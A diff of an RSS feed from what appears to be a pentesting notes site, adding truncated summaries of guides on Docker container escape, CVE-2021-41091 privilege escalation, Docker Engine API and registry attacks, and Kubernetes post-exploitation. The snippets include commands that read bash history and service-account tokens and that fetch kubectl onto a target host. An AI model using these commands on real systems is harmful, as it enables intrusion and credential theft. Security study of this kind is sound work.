@@ -6,14 +6,28 @@
     <description>Recent content in Container on D0CUM3NTN4T10N</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 11 Oct 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 03 Nov 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://documentnation.github.io/tags/container/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Docker Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/container/docker/</link>
-      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/container/docker/</guid>
-      <description>Investigation linkFind Docker Binary linkIf we cannot use docker command by default, we need to find the docker binary.&#xA;find / -name &amp;#34;docker&amp;#34; 2&amp;gt;/dev/null Basic Commands link # List images docker images docker image ls # The history of an image docker image history &amp;lt;image-name&amp;gt; # List containers running docker container ls # or docker ps # List all containers docker container ls -a # or docker ps -a # List secrets docker secret ls # Check configuration of container docker inspect --format=&amp;#39;{{json .</description>
+      <title>Docker Escape</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</link>
+      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</guid>
+      <description>Investigation linkIf we are in the docker container, we first need to investigate basic information about the container.&#xA;# Environment variables env # Command path echo $PATH ls -al /usr/local/bin ls -al /usr/local/sbin ls -al /usr/bin ls -al /bin # Bash history cat /root/.bash_history cat /home/&amp;lt;username&amp;gt;/.bash_history # Interesting Directories ls -al /etc ls -al /mnt ls -al /opt ls -al /srv ls -al /var/www ls -al /tmp ls -al /dev/shm # Cron cat /etc/cron* crontab -l # Process ps aux ps aux | cat # https://github.</description>
+    </item>
+    <item>
+      <title>Moby Docker Engine PrivEsc</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</link>
+      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</guid>
+      <description>Directory Traversal &amp;amp; Arbitrary Command Execution (CVE-2021-41091 ) link1. Find Docker Container Directory linkFirst off, find the directory which the docker container mounted&#xA;findmnt # Results e.g. /var/lib/docker/overlay2/abcdef...xyz/merged Assume the directory above found, we can investigate in the directory.&#xA;ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/ 2. Prepare SUID Binary in Container linkIf we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.</description>
+    </item>
+    <item>
+      <title>Docker Engine API Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/docker-engine-api-pentesting/</link>
+      <pubDate>Sat, 25 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/docker-engine-api-pentesting/</guid>
+      <description>Enumeration link curl &amp;lt;ip&amp;gt;:2375/containers/json # The specific container curl &amp;lt;ip&amp;gt;:2375/containers/&amp;lt;id or name&amp;gt;/json # Logs curl &amp;lt;ip&amp;gt;:2375/containers/&amp;lt;id or name&amp;gt;/logs?stderr=1&amp;amp;stdout=1 # Inpsect changes curl &amp;lt;ip&amp;gt;:2375/containers/&amp;lt;id or name&amp;gt;/changes Privilege Escalation from Docker Image linkWe may be able to get a root shell from remote Docker images.&#xA;1. Check if Docker is Running in Local Machine linkIn local machine, check if docker is running.&#xA;sudo systemctl status docker If the docker is not running, start it.</description>
     </item>
     <item>
       <title>Kubernetes Pentesting</title>
@@ -21,6 +35,13 @@
       <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/kubernetes-pentesting/</guid>
       <description>Check if the Kubectl Command Available in Target Machine link kubectl -h k0s -h k0s kubectl -h microk8s kubectl -h If we cannot find kubectl, upload the binary from local machine.&#xA;First off, install the kubectl in local machine.&#xA;curl -LO &amp;#34;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&amp;#34; python3 -m http.server Then download the binary file into remote machine.&#xA;wget http://&amp;lt;local-ip&amp;gt;:8000/kubectl -O /tmp/kubectl chmod &amp;#43;x /tmp/kubectl Investigation From Inside link # Get JWT cat /var/run/secrets/kubernetes.</description>
+    </item>
+    <item>
+      <title>Docker Registry Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/docker-registry-pentesting/</link>
+      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/docker-registry-pentesting/</guid>
+      <description>Endpoints link /v2/_catalog /v2/&amp;lt;repository&amp;gt;/tags/list # We can download the manifest given tag. /v2/&amp;lt;repository&amp;gt;/manifests/&amp;lt;tag&amp;gt; Extract Layers linkIf we download the manifest with the above, see the content and blobsums (sha256:abcd&amp;hellip;) in fsLayers.&#xA;curl -so 1.tar https://example.com/blobs/sha256:abcd... tar -xvf 1.tar After extracting tar files, investigate files or directories to find the sensitive information.</description>
     </item>
     <item>
       <title>MicroK8s Pentesting</title>
